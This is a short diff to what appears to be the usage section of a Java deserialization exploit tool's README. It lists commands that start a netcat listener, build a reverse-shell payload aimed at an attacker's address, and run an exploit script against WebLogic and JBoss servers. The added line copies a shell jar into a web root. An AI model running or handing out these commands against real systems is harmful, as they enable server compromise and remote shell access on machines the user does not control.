@@ -38,6 +38,7 @@ optional arguments:
 Example:
 
 ▶ nc -vvlp 888
+▶ cp shell.jar /var/www/
 ▶ java -jar reshell.jar [ReverseIP] 888 /tmp/payload
 ▶ python jdexp.py -weblogic [RemoteIP] 7001 /tmp/payload
 ▶ python jdexp.py -jboss [RemoteIP] 80 /tmp/payload
